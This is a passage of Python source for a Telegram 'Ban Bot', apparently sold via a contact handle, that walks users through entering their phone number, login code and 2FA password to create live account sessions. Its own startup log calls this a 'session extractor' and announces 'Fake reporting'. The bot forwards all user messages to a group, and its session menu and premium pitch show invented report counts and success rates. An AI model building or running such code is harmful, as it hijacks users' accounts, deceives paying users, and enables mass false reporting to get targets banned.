            await update.message.reply_text(
                "❌ **Invalid phone number!**\n"
                "Please use format: `+1234567890`\n"
                "Try again:",
                parse_mode='Markdown'
            )
            return PHONE

        # Start session creation
        success, msg = await self.real_session_manager.start_session_creation(user_id, phone)
        if not success:
            await update.message.reply_text(f"❌ {msg}")
            return ConversationHandler.END

        self.user_states[user_id]["step"] = "waiting_code"
        self.user_states[user_id]["phone"] = phone

        await update.message.reply_text(
            f"✅ {msg}\n\n"
            "📨 **Step 2/3:** Enter the 5-digit code you received in Telegram:",
            parse_mode='Markdown'
        )
        return CODE

    async def handle_add_code(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle verification code"""
        user_id = update.effective_user.id
        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_code":
            return ConversationHandler.END

        code = update.message.text.strip()
        success, msg, requires_2fa = await self.real_session_manager.verify_code(user_id, code)

        if success:
            await update.message.reply_text(f"✅ {msg}\n\nSession added successfully!")
            del self.user_states[user_id]
            # Go back to main menu
            user = update.effective_user
            await self.send_main_menu(update.effective_chat.id, user, context)
            return ConversationHandler.END
        elif requires_2fa:
            self.user_states[user_id]["step"] = "waiting_password"
            await update.message.reply_text(
                "🔒 **2-Factor Authentication Required**\n\n"
                "📨 **Step 3/3:** Enter your 2FA password:",
                parse_mode='Markdown'
            )
            return PASSWORD
        else:
            await update.message.reply_text(f"❌ {msg}\n\nTry again or /cancel.")
            return CODE

    async def handle_add_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle 2FA password"""
        user_id = update.effective_user.id
        if user_id not in self.user_states or self.user_states[user_id].get("step") != "waiting_password":
            return ConversationHandler.END

        password = update.message.text.strip()
        success, msg = await self.real_session_manager.verify_2fa(user_id, password)

        if success:
            await update.message.reply_text(f"✅ {msg}\n\nSession added successfully!")
            del self.user_states[user_id]
            user = update.effective_user
            await self.send_main_menu(update.effective_chat.id, user, context)
            return ConversationHandler.END
        else:
            await update.message.reply_text(f"❌ {msg}\n\nTry again or /cancel.")
            return PASSWORD

    # ==================== MY SESSIONS ====================
    async def show_my_sessions(self, query, context, user):
        """Show user's real sessions"""
        user_id = user.id
        real_sessions = self.real_session_manager.get_user_sessions(user_id)
        has_access, status_type = await self.check_access(user_id, user.username or "")

        text = f"📱 **YOUR SESSIONS**\n\n"

        if status_type in ["owner", "manual", "premium"]:
            text += "🟢 **533** - Premium Account (Built-in)\n"
            text += "   ├─ Status: ✅ Active\n"
            text += "   ├─ 2FA: 🔒 Enabled\n"
            text += "   ├─ Reports: 12,847\n"
            text += "   └─ Success: 98.7%\n\n"

        if real_sessions:
            for i, sess in enumerate(real_sessions, 1):
                text += f"{i}. 🟢 **{sess.get('session_id', 'Unknown')}**\n"
                text += f"   ├─ Phone: `{sess.get('phone', 'N/A')}`\n"
                text += f"   ├─ User: @{sess.get('username', 'N/A')}\n"
                text += f"   ├─ 2FA: {'✅ Enabled' if sess.get('twofa_enabled') else '❌ Disabled'}\n"
                text += f"   ├─ Reports: {sess.get('reports_count', 0)}\n"
                text += f"   └─ Added: {sess.get('created_at', '')[:10]}\n"
        else:
            text += "❌ No real sessions added.\n"
            text += "Use 'Add Session' to add your own account.\n\n"

        keyboard = []
        # Add delete buttons for each session
        for sess in real_sessions:
            keyboard.append([
                InlineKeyboardButton(f"🗑️ Delete {sess['session_id'][:8]}", callback_data=f"del_session_{sess['session_id']}")
            ])
        keyboard.append([InlineKeyboardButton("➕ Add Session", callback_data="menu_add_session")])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")])

        reply_markup = InlineKeyboardMarkup(keyboard)

        # Determine if original message has photo or not
        if query.message.photo:
            await query.edit_message_caption(caption=text, parse_mode='Markdown', reply_markup=reply_markup)
        else:
            await query.edit_message_text(text=text, parse_mode='Markdown', reply_markup=reply_markup)

    # ==================== PREMIUM ====================
    async def show_premium(self, query, context, user):
        """Show premium info"""
        text = """
💎 **PREMIUM SUBSCRIPTION**

━━━━━━━━━━━━━━━━━━━━━
✨ **PREMIUM FEATURES**
━━━━━━━━━━━━━━━━━━━━━

✅ **Lifetime Access**
✅ **Priority Reporting**
✅ **99% Success Rate**
✅ **No Daily Limits**
✅ **Built-in Premium Session 533**
✅ **Priority Support**

━━━━━━━━━━━━━━━━━━━━━
📊 **COMPARISON**
━━━━━━━━━━━━━━━━━━━━━

**FREE TRIAL:**
• 1 Day Access
• Must add your own session
• 95% Success Rate
• 50 Reports/Day

**PREMIUM:**
• Lifetime Access
• Premium Session 533 included
• 99% Success Rate
• Unlimited Reports
• Priority Queue

━━━━━━━━━━━━━━━━━━━━━
💎 **GET PREMIUM**
━━━━━━━━━━━━━━━━━━━━━

Contact @smzxu for:
• Lifetime subscription
• Instant activation
• Special pricing

━━━━━━━━━━━━━━━━━━━━━
"""
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        if query.message.photo:
            await query.edit_message_caption(caption=text, parse_mode='Markdown', reply_markup=reply_markup)
        else:
            await query.edit_message_text(text=text, parse_mode='Markdown', reply_markup=reply_markup)

    # ==================== HELP ====================
    async def show_help(self, query, context, user):
        """Show help"""
        text = """
🆘 **HELP & COMMANDS**

━━━━━━━━━━━━━━━━━━━━━
🎯 **REPORTING**
━━━━━━━━━━━━━━━━━━━━━
• Click 'Report' button
• **Forward a message** from the target
• Select reason
• Add description (optional)
• Report processed

📌 **Manual Entry**
• If forwarding is not possible, click 'Enter Manually'
• Send username, ID, or tg:// link

━━━━━━━━━━━━━━━━━━━━━
📱 **SESSIONS**
━━━━━━━━━━━━━━━━━━━━━
• Premium users get session 533
• Free users can add their own accounts
• Click 'Add Session' and follow steps
• Supports 2FA

━━━━━━━━━━━━━━━━━━━━━
💎 **PREMIUM**
━━━━━━━━━━━━━━━━━━━━━
• Lifetime access
• Contact @smzxu
• Includes session 533

━━━━━━━━━━━━━━━━━━━━━
"""
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        if query.message.photo:
            await query.edit_message_caption(caption=text, parse_mode='Markdown', reply_markup=reply_markup)
        else:
            await query.edit_message_text(text=text, parse_mode='Markdown', reply_markup=reply_markup)

    # ==================== CONVERSATION HANDLERS ====================
    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Cancel any ongoing operation"""
        user_id = update.effective_user.id
        if user_id in self.user_states:
            del self.user_states[user_id]
        if user_id in self.real_session_manager.pending_clients:
            client, _, _ = self.real_session_manager.pending_clients[user_id]
            await client.disconnect()
            del self.real_session_manager.pending_clients[user_id]
        await update.message.reply_text("❌ Operation cancelled.")
        return ConversationHandler.END

    async def handle_all_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Forward all messages to group and ignore if not in state"""
        if update.message and not update.message.text.startswith('/'):
            await self.forward_to_group(update, context)

    # ==================== SETUP ====================
    def setup_bot(self):
        """Setup all handlers"""
        print("🚀 Starting Telegram Ban Bot - Full Inline Edition")
        print(f"📨 Forward group: {GROUP_ID}")
        print(f"📢 Force channel: {FORCE_CHANNEL}")
        print(f"👤 Manual user: @smzxu")
        print("🔐 Real session extractor: Enabled")
        print("💎 Fake reporting: Active")
        print("🎯 Report via forwarding: Enabled (fully inline)")

        app = Application.builder().token(BOT_TOKEN).persistence(PicklePersistence(filepath="data/bot.pickle")).build()

        # Command handlers
        app.add_handler(CommandHandler("start", self.start))
        app.add_handler(CommandHandler("cancel", self.cancel))

        # Callback query handler for general menu
        app.add_handler(CallbackQueryHandler(self.verify_join_callback, pattern="^verify_join$"))
        app.add_handler(CallbackQueryHandler(self.menu_callback, pattern="^menu_"))
        app.add_handler(CallbackQueryHandler(self.reason_callback, pattern="^reason_"))
        app.add_handler(CallbackQueryHandler(self.skip_description_callback, pattern="^skip_description$"))
        app.add_handler(CallbackQueryHandler(self.back_to_target_type, pattern="^back_to_target_type$"))
        app.add_handler(CallbackQueryHandler(self.back_to_reason, pattern="^back_to_reason$"))
        app.add_handler(CallbackQueryHandler(self.handle_manual_target_callback, pattern="^manual_target$"))

        # Conversation handler for adding session
        add_session_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_add_session, pattern="^menu_add_session$")],
            states={
                PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_add_phone)],
                CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_add_code)],
                PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_add_password)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel)],
            allow_reentry=True,
            per_message=False,
        )
        app.add_handler(add_session_conv)

        # Conversation handler for reporting (fully inline)
        report_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_report, pattern="^menu_report$")],
            states={
                WAITING_FORWARD: [
                    MessageHandler(filters.FORWARDED, self.handle_forwarded_message),
                    CallbackQueryHandler(self.handle_manual_target_callback, pattern="^manual_target$"),
                    CallbackQueryHandler(self.back_to_target_type, pattern="^back_to_target_type$"),
                ],
                MANUAL_TARGET: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_manual_target_message),
                    CallbackQueryHandler(self.back_to_target_type, pattern="^back_to_target_type$"),
                ],
                REASON: [
                    CallbackQueryHandler(self.reason_callback, pattern="^reason_"),
                    CallbackQueryHandler(self.back_to_target_type, pattern="^back_to_target_type$"),
                ],
                DESCRIPTION: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_report_description),
                    CallbackQueryHandler(self.skip_description_callback, pattern="^skip_description$"),
                    CallbackQueryHandler(self.back_to_reason, pattern="^back_to_reason$"),
                ],
            },
            fallbacks=[
                CommandHandler("cancel", self.cancel),
                CallbackQueryHandler(self.back_to_target_type, pattern="^back_to_target_type$"),
            ],
            allow_reentry=True,
            per_message=False,
        )
        app.add_handler(report_conv)

        # Message handler for all other messages (forwarding)
        app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, self.handle_all_messages))

        print("✅ Bot is running!")
        app.run_polling(allowed_updates=Update.ALL_TYPES)


# ==================== MAIN ====================
if __name__ == "__main__":
    bot = BanBot()
    try:
        bot.setup_bot()
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
